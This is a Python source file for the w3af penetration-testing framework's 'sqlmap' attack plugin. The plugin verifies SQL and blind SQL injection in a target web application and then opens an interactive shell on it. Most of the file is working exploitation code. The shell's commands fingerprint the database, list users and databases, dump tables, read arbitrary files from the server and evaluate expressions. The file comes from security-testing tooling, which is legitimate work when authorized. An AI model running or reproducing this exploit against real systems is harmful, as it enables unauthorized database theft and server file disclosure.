'''
sqlmap.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from core.data.kb.shell import shell as shell

import core.data.request.httpPostDataRequest as httpPostDataRequest
import core.data.request.httpQsRequest as httpQsRequest

import core.controllers.outputManager as om
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln

import core.data.parsers.urlParser as urlParser
from core.controllers.w3afException import w3afException

from plugins.attack.db.dbDriverBuilder import dbDriverBuilder as dbDriverBuilder
from core.controllers.sqlTools.blindSqli import blindSqli as blindSqliTools

from core.controllers.threads.threadManager import threadManagerObj as tm

# options
from core.data.options.option import option
from core.data.options.optionList import optionList

SQLMAPCREATORS = 'sqlmap coded by inquis <bernardo.damele@gmail.com> and belch <daniele.bellucci@gmail.com>'

class sqlmap(baseAttackPlugin):
    '''
    Exploits [blind] sql injections using sqlmap ( http://sqlmap.sf.net ).
    '''
        
    '''
    Plugin author:
    @author: Andres Riancho ( andres.riancho@gmail.com )
    
    sqlmap authors:
    @author: Bernardo Damele (inquis) - maintainer
    @author: Daniele Bellucci (belch) - initial author
    '''
        
    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # Internal variables
        self._vuln = None
        self._driver = None
        
        # User configured options for fastExploit
        self._url = None
        self._method = None
        self._data = None
        self._injvar = None
        
        # User configured variables
        self._equalLimit = 0.85
        self._equAlgorithm = 'setIntersection'
        self._goodSamaritan = True
        self._generateOnlyOne = True
        
    def fastExploit( self ):
        '''
        Exploits a web app with [blind] sql injections vulns.
        The options are configured using the plugin options and setOptions() method.
        '''
        om.out.debug( 'Starting sqlmap fastExploit.' )
        om.out.console( SQLMAPCREATORS )
        
        if self._url == None or self._method == None or self._data == None or self._injvar == None:
            raise w3afException('You have to configure the plugin parameters')
        else:
            
            freq = None
            if self._method == 'POST':
                freq = httpPostDataRequest.httpPostDataRequest()
            elif self._method == 'GET':
                freq = httpQsRequest.httpQsRequest()
            else:
                raise w3afException('Method not supported.')
            
            freq.setURL( self._url )
            freq.setDc( urlParser.getQueryString( 'http://a/a.txt?' + self._data ) )
            freq.setHeaders( {} )
            
            bsql = blindSqliTools()
            bsql.setUrlOpener( self._urlOpener )
            bsql.setEqualLimit( self._equalLimit )
            bsql.setEquAlgorithm( self._equAlgorithm )
            
            res = bsql.verifyBlindSQL( freq, self._injvar )
            if res == []:
                raise w3afException('Could not verify sql injection.')
            else:
                om.out.console('SQL injection could be verified, trying to create the DB driver.')
                for vuln in res:
                    # Try to get a shell using all vuln
                    om.out.information('Trying to exploit using vulnerability with id: ' + str( vuln.getId() ) + '. Please wait...' )
                    s = self._generateShell(vuln)
                    if s != None:
                        kb.kb.append( self, 'shell', s )
                        return [s,]
                    
                raise w3afException('No exploitable vulnerabilities found.')
        
    def getAttackType(self):
        return 'shell'
    
    def getExploitableVulns(self):
        vulns = kb.kb.getData( 'blindSqli' , 'blindSqli' )
        vulns.extend( kb.kb.getData( 'sqli' , 'sqli' ) )
        return vulns

    def canExploit( self, vulnToExploit=None ):
        '''
        Searches the kb for vulnerabilities that the plugin can exploit.

        @return: True if plugin knows how to exploit a found vuln.
        '''
        vulns = self.getExploitableVulns()

        if vulnToExploit != None:
            vulns = [ v for v in vulns if v.getId() == vulnToExploit ]
            
        if len(vulns) != 0:
            return True
        else:
            om.out.information( 'No [blind] sql injection vulnerabilities have been found.' )
            om.out.information( 'Hint #1: Try to find vulnerabilities using the audit plugins.' )
            om.out.information( 'Hint #2: Use the set command to enter the values yourself, and then exploit it using fastExploit.' )
            return False

    def exploit( self, vulnToExploit=None ):
        '''
        Exploits a [blind] sql injections vulns that was found and stored in the kb.

        @return: True if the shell is working and the user can start calling rexec
        '''
        om.out.console( SQLMAPCREATORS )
            
        if not self.canExploit():
            return []
        else:
            vulns = kb.kb.getData( 'blindSqli' , 'blindSqli' )
            vulns.extend( kb.kb.getData( 'sqli' , 'sqli' ) )
            
            bsql = blindSqliTools()
            bsql.setUrlOpener( self._urlOpener )
            bsql.setEqualLimit( self._equalLimit )
            bsql.setEquAlgorithm( self._equAlgorithm )
            
            vulns2 = []
            for v in vulns:
            
                # Filter the vuln that was selected by the user
                if vulnToExploit != None:
                    if vulnToExploit != v.getId():
                        continue
            
                # The user didn't selected anything, or we are in the selected vuln!
                om.out.debug('Verifying vulnerability in URL: ' + v.getURL() )
                vulns2.extend( bsql.verifyBlindSQL( v.getMutant().getFuzzableReq(), v.getVar() ) )
            
            # Ok, go to the next stage with the filtered vulnerabilities
            vulns = vulns2
            
            exploitable = False
            for vuln in vulns:
                # Try to get a shell using all vuln
                om.out.information('Trying to exploit using vulnerability with id: ' + str( vuln.getId() ) + '. Please wait...' )
                s = self._generateShell(vuln)
                if s != None:
                    if self._generateOnlyOne:
                        # A shell was generated, I only need one point of exec.
                        return [s,]
                    else:
                        # Keep adding all shells to the kb
                        pass
                    
        return [s, ]
                
    def _generateShell( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit, as it was saved in the kb or supplied by the user with set commands.
        @return: A sqlmap shell object if sqlmap could fingerprint the database.
        '''
        bsql = blindSqliTools()
        bsql.setEqualLimit( self._equalLimit )
        bsql.setEquAlgorithm( self._equAlgorithm )
            
        dbBuilder = dbDriverBuilder( self._urlOpener, bsql.equal )
        driver = dbBuilder.getDriverForVuln( vuln )
        if driver == None:
            return None
        else:
            # Create the shell object
            s = sqlShellObj( vuln )
            s.setGoodSamaritan( self._goodSamaritan )
            s.setDriver( driver )
            kb.kb.append( self, 'shells', s )
            
            return s
        
    def getOptionsXML(self):
        '''
        This method returns a XML containing the Options that the plugin has.
        Using this XML the framework will build a window, a menu, or some other input method to retrieve
        the info from the user. The XML has to validate against the xml schema file located at :
        w3af/core/ui/userInterface.dtd
        
        @return: XML with the plugin options.
        ''' 
        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
        <OptionList>\
            <Option name="url">\
                <default></default>\
                <desc>URL to exploit with fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="method">\
                <default>GET</default>\
                <desc>Method to use with fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="injvar">\
                <default></default>\
                <desc>The variable name where to inject.</desc>\
                <type>string</type>\
            </Option>\
            <Option name="data">\
                <default></default>\
                <desc>The data, like: \'f00=bar\'</desc>\
                <type>string</type>\
            </Option>\
            <Option name="equAlgorithm">\
                <default>'+self._equAlgorithm+'</default>\
                <desc>The algorithm to use in the comparison of true and false response for blind sql.</desc>\
                <help>The options are: "stringEq", "setIntersection" and "intelligentCut" . Read the user documentation for details.</help>\
                <type>string</type>\
            </Option>\
            <Option name="equalLimit">\
                <default>'+str(self._equalLimit)+'</default>\
                <desc>Set the equal limit variable</desc>\
                <help>Two pages are equal if they match in more than equalLimit. Only used when equAlgorithm is set to setIntersection.</help>\
                <type>float</type>\
            </Option>\
            <Option name="goodSamaritan">\
                <default>'+str(self._goodSamaritan)+'</default>\
                <desc>Enable or disable the good samaritan module</desc>\
                <help>The good samaritan module is a the best way to speed up blind sql exploitations. It\'s really simple, you see messages\
                in the console that show the status of the discovery and you can help the discovery. For example, if you see "Micros" you could\
                type "oft", and if it\'s correct, you have made your good action of the day, speeded up the discovery AND had fun doing it.</help>\
                <type>boolean</type>\
            </Option>\
            <Option name="generateOnlyOne">\
                <default>'+str(self._generateOnlyOne)+'</default>\
                <desc>If true, this plugin will try to generate only one shell object.</desc>\
                <type>boolean</type>\
            </Option>\
        </OptionList>\
        '

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter optionsMap: A map with the options for the plugin.
        @return: No value is returned.
        '''
        self._url = urlParser.uri2url( optionsMap['url'] )
            
        if optionsMap['method'] not in ['GET','POST']:
            raise w3afException('Unknown method.')
        else:
            self._method = optionsMap['method']

        self._data = optionsMap['data']
        self._injvar = optionsMap['injvar']
        self._equAlgorithm = optionsMap['equAlgorithm']
        self._equalLimit = optionsMap['equalLimit']
        self._goodSamaritan = optionsMap['goodSamaritan']
        self._generateOnlyOne = optionsMap['generateOnlyOne']

    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.1

    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits [blind] sql injections.
        
        The original sqlmap program was coded by Bernardo Damele and Daniele Bellucci, many thanks to both of
        them.
        
        Seven configurable parameters exist:
            - url
            - method
            - data
            - injvar
            - equAlgorithm
            - equalLimit
        '''

class sqlShellObj(shell):
    def _parse( self, command ):
        c = command.split(' ')[0]
        params = command.split(' ')[1:]
        return c, params

    def setDriver( self, d ):
        self._driver = d
    
    def setGoodSamaritan( self, gs ):
        self._goodSamaritan = gs
    
    def rexec( self, command ):
        '''
        This method is called when a command is being sent to the remote server.

        @parameter command: The command to send ( users, dbs, etc ).
        @return: The result of the command.
        '''
        if not self._driver:
            raise w3afException('No driver could be created.')
        
        _methodMap = {}
        _methodMap['fingerprint'] = self._driver.getFingerprint
        _methodMap['banner'] = self._driver.getBanner
        _methodMap['current-user'] = self._driver.getCurrentUser
        _methodMap['current-db'] = self._driver.getCurrentDb
        _methodMap['users'] = self._driver.getUsers
        _methodMap['dbs'] = self._driver.getDbs
        _methodMap['tables'] = self._driver.auxGetTables
        _methodMap['columns'] = self._driver.auxGetColumns
        _methodMap['dump'] = self._driver.auxDump
        _methodMap['file'] = self._driver.getFile
        _methodMap['expression'] = self._driver.getExpr
        _methodMap['union-check'] = self._driver.unionCheck
        _methodMap['help'] = self.help
    
        commandList = command.split(' ')
        if not len( commandList ):
            om.out.console('Unknown command. Please read the help:')
            self.help()
            return ''
        else:
            cmd = commandList[0]
            method = ''
            if commandList[0] in _methodMap:
                method = _methodMap[ cmd ]
            else:
                if self._goodSamaritan and self._driver.isRunningGoodSamaritan():
                    self._driver.goodSamaritanContribution( command )
                    return None
                else:
                    om.out.console('Unknown command. Please read the help:')
                    self.help()
                    return ''

            tm.startFunction( target=self._runCommand, args=(method, command,), ownerObj=self, restrict=False )
            return None

            
    def _runCommand( self, method, command ):
        # Parse this, separate user and command
        command, parameterList = self._parse( command )
        args = tuple( parameterList )

        if self._goodSamaritan and command.strip() != 'help':
            self._driver.startGoodSamaritan()
        
        try:
            res = apply( method, args )
        except TypeError, t:
            res = 'Invalid number of parameters for command.'
        except KeyboardInterrupt, k:
            raise k
        except w3afException, e:
            res = 'An unexpected error was found while trying to run the specified command.\n'
            res +='Exception: "' + str(e) + '"'
        else:            
            res = self._driver.dump.dump( command, args, res )
            res = res.replace('\n','\r\n')

        # Always stop the good samaritan
        self._driver.stopGoodSamaritan() 
        om.out.console( '\r\n' + res )
        self._showPrompt()

    def _showPrompt( self ):
        om.out.console('w3af/exploit/'+self.getName()+'-'+str(self.getExploitResultId())+'>>>', newLine = False)
        
    def help( self ):
        '''
        Print the help to the user.
        '''
        om.out.console('')
        om.out.console( SQLMAPCREATORS )
        om.out.console('fingerprint             perform an exaustive database fingerprint')
        om.out.console('banner                  get database banner')
        om.out.console('current-user            get current database user')
        om.out.console('current-db              get current database name')
        om.out.console('users                   get database users')
        om.out.console('dbs                     get available databases')
        om.out.console('tables [db]             get available databases tables (optional: database)')
        om.out.console('columns <table> [db]    get table columns (required: table optional: database)')
        om.out.console('dump <table> [db]       dump a database table (required: -T optional: -D)')
        om.out.console('file <FILENAME>         read a specific file content')
        om.out.console('expression <EXPRESSION> expression to evaluate')
        om.out.console('union-check             check for UNION sql injection')
        self._showPrompt()
        return True
    
    def _identifyOs( self ):
        # hmmm....
        self._rSystem = self._rSystemName = self._dbms = self._driver.getFingerprint()
        self._rUser = self._driver.getCurrentUser()
    
    def getRemoteSystem( self ):
        return self._dbms

    def __repr__( self ):
        if not self._rOS:
            self._identifyOs()
        return '<sql object ( dbms: "'+self._dbms+'" | ruser: "'+ self._rUser +'" )>'
        
    __str__ = __repr__
    def end( self ):
        om.out.debug('sqlmap cleanup complete.')
            
    def getName( self ):
        return 'sqlmap'
        
